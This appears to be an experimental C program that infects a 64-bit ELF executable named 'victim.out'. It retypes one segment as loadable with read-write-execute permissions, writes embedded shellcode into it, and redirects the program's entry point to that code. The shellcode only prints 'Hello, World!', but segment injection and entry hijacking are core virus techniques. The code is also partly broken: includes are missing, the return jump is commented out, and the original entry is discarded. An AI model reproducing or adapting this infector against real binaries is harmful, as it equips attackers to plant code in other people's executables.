#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <elf.h>

void set_segment_permissions(uint8_t *file, int segment_idx, uint32_t flags) {
    Elf64_Ehdr *header = (Elf64_Ehdr *)file;

    Elf64_Off segment_table = header->e_phoff;
    uint16_t segment_entry_size = header->e_phentsize;

    Elf64_Off injection_target = segment_table + (segment_entry_size * segment_idx);
    Elf64_Phdr* injection_descriptor = (Elf64_Phdr*)&file[injection_target];
    injection_descriptor->p_flags = flags;
}

void set_segment_type(uint8_t *file, int segment_idx, uint32_t type) {
    Elf64_Ehdr *header = (Elf64_Ehdr *)file;

    Elf64_Off segment_table = header->e_phoff;
    uint16_t segment_entry_size = header->e_phentsize;

    Elf64_Off injection_target = segment_table + (segment_entry_size * segment_idx);
    Elf64_Phdr* injection_descriptor = (Elf64_Phdr*)&file[injection_target];
    injection_descriptor->p_type = type;
}

Elf64_Off get_segment_address(uint8_t *file, int segment_idx) {
    Elf64_Ehdr *header = (Elf64_Ehdr *)file;

    Elf64_Off segment_table = header->e_phoff;
    uint16_t segment_entry_size = header->e_phentsize;

    Elf64_Off injection_target = segment_table + (segment_entry_size * segment_idx);
    Elf64_Phdr* injection_descriptor = (Elf64_Phdr*)&file[injection_target];
    return injection_descriptor->p_offset;
}

uint64_t get_segment_size(uint8_t *file, int segment_idx) {
    Elf64_Ehdr *header = (Elf64_Ehdr *)file;

    Elf64_Off segment_table = header->e_phoff;
    uint16_t segment_entry_size = header->e_phentsize;

    Elf64_Off injection_target = segment_table + (segment_entry_size * segment_idx);
    Elf64_Phdr* injection_descriptor = (Elf64_Phdr*)&file[injection_target];
    return injection_descriptor->p_memsz;
}

int main() {
    int fd = open("victim.out", O_RDWR, (mode_t)0600);
    struct stat st;
    fstat(fd, &st);
    printf("Opened file size: %d\n", st.st_size);
    uint8_t * victim = mmap(0, st.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0);
    for (int i = 0; i < 10; i++) {
        printf("%c ", victim[i]);
    }

    Elf64_Ehdr *header = (Elf64_Ehdr *)victim;
    printf("Elf Header ident: %s\n", header->e_ident);
    printf("Elf entry: %x\n", header->e_entry);
    Elf64_Addr saved_entry = header->e_entry;

    Elf64_Off first_segment_addr = get_segment_address(victim, 8);
    uint64_t first_segment_size = get_segment_size(victim, 8);
    uint64_t avaliable_size = first_segment_size;
    printf("I can write %x bytes from %p\n", avaliable_size, first_segment_addr);
    int i = 0;

    int jump_offset = (int)first_segment_addr-(int)saved_entry;
    printf("%x\n", jump_offset);
    uint8_t return_code[10];
    return_code[0] = '\68';

    unsigned int decomposed = (unsigned int)jump_offset;
    while (decomposed > 1) {
        return_code[i+1] = (decomposed>>=(i*8))&0xFF;
        printf("Byte %d: %x\n", i, return_code[i+1]);
        i++;
    }
    return_code[i+1] = '\0';

    for (int j = 0; j < i+2 ; j++)
        printf("%x ", return_code[j]);
    printf("\n");


    for (i = 0; i < 4; i++) {
        //victim[saved_entry+i] = (char)return_code[i];
        //printf("Writing %x to %p\n", victim[saved_entry+i], saved_entry+i);
    }
    //1110 0011 0101
    //0001 1100 1011
    //ffff ffff ffff f1cb

    const char shellcode[] = "\xeb\x1a\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\xb0\x01\x40\xb7\x01\x5e\xb2\x0f\x0f\x05\xc3\x90\x90\x90\x90\x0f\x05\xe8\xe1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21\x0a";

    if (strlen(shellcode) > avaliable_size) {
        printf("Shellcode doesn't fit\n");
        exit(1);
    }

    set_segment_type(victim, 8, PT_LOAD);
    set_segment_permissions(victim, 8, (PF_X | PF_W | PF_R));

    for (i = 0; i < strlen(shellcode); i++) {
        victim[first_segment_addr+i] = shellcode[i];
    }
    printf("Code overwritten until %x\n", i+first_segment_addr);
    header->e_entry = first_segment_addr;
}